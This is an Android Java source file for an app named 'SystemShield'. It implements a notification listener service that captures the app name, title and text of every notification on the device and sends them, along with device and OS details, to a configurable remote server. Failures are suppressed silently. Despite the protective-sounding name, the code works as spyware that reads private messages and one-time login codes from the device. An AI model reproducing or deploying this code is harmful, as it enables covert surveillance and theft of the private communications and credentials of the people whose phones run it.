package com.atiksoftware.systemshield;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class NLService extends NotificationListenerService {
    SharedPreferences sharedPreferences = null;

    @Override
    public void onCreate() {
        super.onCreate();
        //Log.d("SystemShield", "NLService onCreate");
        Context context = getApplicationContext();
        sharedPreferences = context.getSharedPreferences("options", MODE_PRIVATE);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);
        if (sbn.getNotification() == null)
            return;

        try{
            String packageName = sbn.getPackageName();
            String title = sbn.getNotification().extras.getString("android.title");
            String text = sbn.getNotification().extras.getString("android.text");
            String created_at = String.valueOf(sbn.getPostTime());

            if (title == null && text == null)
                return;

            sendNotificationToAPI(packageName, title, text, created_at);
        }catch (Exception ignored){
        }
    }


    private void sendNotificationToAPI(String packageName, String title, String text, String created_at){
        try {
            String server_api_url = sharedPreferences.getString("api_server_url", "");
            if (server_api_url.isEmpty())
                return;

            OkHttpClient client = new OkHttpClient();
            RequestBody formBody = new FormBody.Builder()
                    .add("package_name", packageName)
                    .add("title", title)
                    .add("text", text)
                    .add("created_at", created_at)
                    .add("device", Build.DEVICE)
                    .add("model", Build.MODEL)
                    .add("product", Build.PRODUCT)
                    .add("manufacturer", Build.MANUFACTURER)
                    .add("brand", Build.BRAND)
                    .add("android_version", Build.VERSION.RELEASE)
                    .add("sdk_version", String.valueOf(Build.VERSION.SDK_INT))
                    .build();

            Request request = new Request.Builder()
                    .url(server_api_url)
                    .post(formBody)
                    .build();
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    e.printStackTrace();
                }
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
            //Log.d("SystemShield", "sendNotificationToAPI Error: " + e.getMessage());
        }
    }
}
